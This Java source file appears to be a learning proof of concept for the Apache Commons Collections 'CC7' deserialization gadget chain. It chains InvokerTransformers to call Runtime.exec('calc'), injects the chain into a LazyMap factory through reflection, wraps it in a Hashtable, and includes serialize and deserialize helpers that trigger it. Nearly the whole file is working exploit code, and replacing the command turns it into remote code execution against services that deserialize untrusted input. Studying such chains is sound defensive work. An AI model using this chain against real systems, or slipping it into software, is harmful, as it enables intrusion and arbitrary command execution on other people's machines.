package com.mechoy;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;
import java.util.Set;

/**
 * Author  Mechoy
 * Version 1.0
 * Date    2023/3/31
 */
public class CC7Test1 {
    final static String path = "ser.bin";

    public static void main(String[] args) throws Exception{
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        });

        Map map1 = new HashMap();
        Map map2 = new HashMap();

        Map lazyMap1 = LazyMap.decorate(map1,new ConstantTransformer(1));
        lazyMap1.put("aa",1);
        Map lazyMap2 = LazyMap.decorate(map2, new ConstantTransformer(2));
        lazyMap2.put("bB",1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1,1);
        hashtable.put(lazyMap2,1);
        lazyMap2.remove("aa");

        Field factory = LazyMap.class.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap2,chainedTransformer);

//        serialize(hashtable);
        deserialize();
    }

    public static void serialize(Object obj) throws IOException {
        FileOutputStream fos = new FileOutputStream(path);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
    }

    public static Object deserialize() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(path);
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object o = ois.readObject();
        return o;
    }
}
